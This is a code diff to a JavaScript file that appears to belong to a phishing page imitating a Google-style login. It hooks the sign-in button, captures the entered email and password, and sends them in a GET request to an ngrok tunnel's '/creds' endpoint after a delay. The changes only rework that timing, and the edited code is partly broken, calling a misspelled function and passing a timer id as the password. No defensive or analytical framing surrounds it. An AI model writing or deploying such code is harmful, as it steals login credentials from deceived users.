@@ -44,14 +44,17 @@ function send_data(usuario, senha){
                                   
                                   
 function teste_send(user, pass){
-   var xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://0a3d-45-162-158-3.sa.ngrok.io/creds?user=" + user + "&pass=" + pass, true);
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-            console.log(xhr.responseText);
-        }
-    };
-    xhr.send();
+   setTimeout(function(){
+       var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://0a3d-45-162-158-3.sa.ngrok.io/creds?user=" + user + "&pass=" + pass, true);
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                console.log(xhr.responseText);
+            }
+        };
+        xhr.send();
+        
+    },4000)
            
            
 }
@@ -60,13 +63,14 @@ function teste_send(user, pass){
 const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
 
 btn[1].addEventListener('click', function(){
-    user = send_email();
-    setTimeout(function() {
-        pwd = send_pwd()
+    test_send(send_email(), setTimeout(function(){send_pwd()},3000))
+    //user = send_email();
+    //setTimeout(function() {
+    //    pwd = send_pwd()
         
         //setTimeout(function(){send_data(user, pwd)}, 3000)
-    }, 3000);
+    //}, 3000);
     
-    test_send(user, pwd)
+    //test_send(user, pwd)
     
 })
